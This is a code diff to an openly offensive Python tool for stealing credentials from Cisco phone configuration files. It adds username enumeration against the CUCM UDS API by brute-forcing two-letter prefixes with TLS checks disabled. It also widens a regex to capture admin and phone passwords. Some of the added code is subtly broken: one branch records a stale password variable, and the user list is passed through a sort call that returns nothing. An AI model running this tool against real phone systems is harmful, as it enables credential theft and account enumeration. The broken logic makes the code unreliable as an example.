@@ -4,6 +4,11 @@ import requests
 import re
 import ipaddress
 import socket
+import string
+from bs4 import BeautifulSoup
+from alive_progress import alive_bar
+
+requests.packages.urllib3.disable_warnings()
 
 def banner():
     print(
@@ -89,7 +94,7 @@ def get_hostname_from_phone(phone):
     __http_response = requests.get(url)
     if __http_response.status_code == 404:
         if verbose:
-            print('Config file not found on HTTP Server: {0}'.format(filename))
+            print('Config file not found on HTTP Server: {0}'.format(phone))
     else:
         lines = __http_response.text
     return parse_phone_hostname(lines)
@@ -187,6 +192,25 @@ def get_config_names(CUCM_host,hostnames=None):
     else:
         return config_names
 
+def get_users_api(CUCM_host):
+    usernames = []
+    base_url = f'https://{CUCM_host}:8443/cucm-uds/users?name='
+    try:
+        with alive_bar(676, title="> Identifying Users  ", ) as prog_bar:
+            for char1 in string.ascii_lowercase:
+                for char2 in string.ascii_lowercase:
+                    prog_bar()
+                    url = base_url+char1+char2
+                    __http_response = requests.get(url, timeout=2,verify=False)
+                    if __http_response.status_code != 404:
+                        lines = __http_response.text
+                        soup = BeautifulSoup(lines, 'lxml')
+                        for user in soup.find_all('username'):
+                            usernames.append(user.text)
+    except requests.exceptions.ConnectionError:
+        print('CUCM Server {} is not responding'.format(CUCM_host))
+    return usernames
+
 def search_for_secrets(CUCM_host,filename):
     global found_credentials
     global found_usernames
@@ -204,7 +228,7 @@ def search_for_secrets(CUCM_host,filename):
         else:
             lines = __http_response.text
         for line in lines.split('\n'):
-            match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>)',line)
+            match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
             if match:
                 if match.group(2):
                     user = match.group(2)
@@ -215,6 +239,9 @@ def search_for_secrets(CUCM_host,filename):
                 if match.group(4):
                     user2 = match.group(4)
                     found_usernames.append((user2,filename))
+                if match.group(5):
+                    user2 = match.group(5)
+                    found_credentials.append(('unknown',password,filename))
         if verbose:
             if user and password:
                 print('{0}\t{1}\t{2}'.format(filename,user,password))
@@ -237,6 +264,7 @@ if __name__ == '__main__':
 
     parser = argparse.ArgumentParser(description='Penetration Toolkit for attacking Cisco Phone Systems by stealing credentials from phone configuration files')
     parser.add_argument('-H','--host', default=None, type=str, help='IP Address of Cisco Unified Communications Manager')
+    parser.add_argument('--userenum', action='store_true', default=False, help='Enable user enumeration via UDS api')
     parser.add_argument('-p','--phone', type=str, help='IP Address of a Cisco Phone')
     parser.add_argument('-s','--subnet', type=str, help='IP Address of a Cisco Phone')
     parser.add_argument('-v','--verbose', action='store_true', default=False, help='Enable Verbose Logging')
@@ -312,10 +340,10 @@ if __name__ == '__main__':
 
     if file_names is None:
         print('Unable to detect file names from CUCM')
-        quit(1)
     else:
         for file in file_names:
             search_for_secrets(CUCM_host,file)
+
     if found_credentials != []:
         print('Credentials Found in Configurations!')
         for cred in found_credentials:
@@ -325,3 +353,12 @@ if __name__ == '__main__':
         print('Usernames Found in Configurations!')
         for usernames in found_usernames:
             print('{0}\t{1}'.format(usernames[0],usernames[1]))
+    if args.userenum:
+        print('Getting users from UDS API.')
+        #each API call is limited by default to 64 users per request
+        api_users = get_users_api(CUCM_host)
+        if api_users != []:
+            print('The following users were identified from the UDS API')
+            sorted_unique_users = set(api_users.sort())
+            for username in sorted_unique_users:
+                print('{0}'.format(username))
